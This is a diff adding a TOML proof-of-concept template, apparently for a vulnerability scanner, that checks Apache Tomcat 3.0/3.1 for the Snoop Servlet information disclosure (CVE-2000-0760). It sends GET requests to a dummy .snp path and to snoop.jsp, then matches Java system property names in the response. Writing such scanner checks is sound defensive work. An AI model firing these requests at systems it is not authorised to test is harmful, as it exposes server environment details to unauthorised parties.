@@ -1,0 +1,52 @@
+[info]
+author = "ave"
+description = "验证目标 Apache Tomcat 3.0/3.1 是否存在 Snoop Servlet 信息泄露漏洞。通过请求一个不存在的 .snp 后缀路径，触发 Snoop Servlet 返回系统属性、环境变量、请求参数等敏感信息。"
+id = "POC-AVE-2000-0002"
+name = "Jakarta Tomcat Snoop Servlet Information Disclosure PoC"
+severity = "medium"
+tags = ["ave-2000-0002"]
+vuln_id = [
+    "CVE-2000-0760",
+    "AVE-2000-0002",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/examples/jsp/snp/anything.snp"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "java.version",
+    "os.name",
+    "java.home",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/examples/jsp/snp/snoop.jsp"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "java.version",
+    "os.name",
+    "java.home",
+]
